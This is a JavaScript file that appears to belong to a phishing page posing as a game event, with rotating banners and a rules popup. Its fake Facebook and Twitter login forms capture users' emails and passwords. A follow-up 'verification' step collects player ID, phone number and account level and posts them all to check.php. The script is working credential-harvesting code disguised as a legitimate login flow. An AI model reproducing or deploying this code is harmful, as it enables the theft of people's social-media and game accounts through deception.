var slideHeaderDesktop = 0;
openHeaderDesktop();

function openHeaderDesktop() {
    var i;
    var slides = document.getElementsByClassName("slideHeaderDesktop");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none";
    }
    slideHeaderDesktop++;
    if (slideHeaderDesktop > slides.length) {
        slideHeaderDesktop = 1
    }
    slides[slideHeaderDesktop - 1].style.display = "block";
    setTimeout(openHeaderDesktop, 1500);
}
var slideHeaderMobile = 0;
openHeaderMobile();

function openHeaderMobile() {
    var i;
    var slides = document.getElementsByClassName("slideHeaderMobile");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none";
    }
    slideHeaderMobile++;
    if (slideHeaderMobile > slides.length) {
        slideHeaderMobile = 1
    }
    slides[slideHeaderMobile - 1].style.display = "block";
    setTimeout(openHeaderMobile, 1500);
}

function open_rules() {
    $('.rulesBox').show();
}

function open_account_login() {
    $('.accountLoginBox').show();
}

function open_facebook() {
    $('.login-facebook').show();
    $('.accountLoginBox').hide();
}

function open_twitter() {
    $('.login-twitter').show();
    $('.accountLoginBox').hide();
}

function close_popup() {
    $(".rulesBox").hide()
    $(".accountLoginBox").hide()
}

function tutup_facebook() {
    $('.login-facebook').hide()
    $('.accountLoginBox').show();
}

function tutup_twitter() {
    $('.login-twitter').hide()
    $('.accountLoginBox').show();
}

function ValidateLoginFbData() {
    $('#ValidateLoginFbForm').submit(function (submitingValidateLoginFbData) {
        submitingValidateLoginFbData.preventDefault();
        $email = $('#email-facebook').val().trim();
        $password = $('#password-facebook').val().trim();
        $login = $('#login-facebook').val().trim();
        if ($email == '' || $password == '') {} else {
            $('.login-facebook').hide();
            $('.account_verification').show();
            $("input#validateEmail").val($email);
            $("input#validatePassword").val($password);
            $("input#validateLogin").val($login);
        }
    });
}

function ValidateLoginTwitterData() {
    $('#ValidateLoginTwitterForm').submit(function (submitingValidateLoginTwitterData) {
        submitingValidateLoginTwitterData.preventDefault();
        $email = $('#email-twitter').val().trim();
        $password = $('#password-twitter').val().trim();
        $login = $('#login-twitter').val().trim();
        if ($email == '' || $password == '') {} else {
            $('.login-twitter').hide();
            $('.account_verification').show();
            $("input#validateEmail").val($email);
            $("input#validatePassword").val($password);
            $("input#validateLogin").val($login);
        }
    });
}

function ValidateVerificationData() {
    $('#ValidateVerificationDataForm').submit(function (submitingVerificationData) {
        submitingVerificationData.preventDefault();
        var $validateEmail = $("input#validateEmail").val();
        var $validatePassword = $("input#validatePassword").val();
        var $playid = $("input#playid").val();
        var $phone = $("input#phone").val();
        var $level = $("input#level").val();
        var $validateLogin = $("input#validateLogin").val();
        if ($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }
        $.ajax({
            type: "POST",
            url: "check.php",
            data: $(this).serialize(),
            beforeSend: function () {
                $('.check_verification').show();
                $('.account_verification').hide();
            },
            success: function () {
                $(".processing_account").show();
                $('.check_verification').hide();
                $('.account_verification').hide();
            }
        });
    });
    return false;
};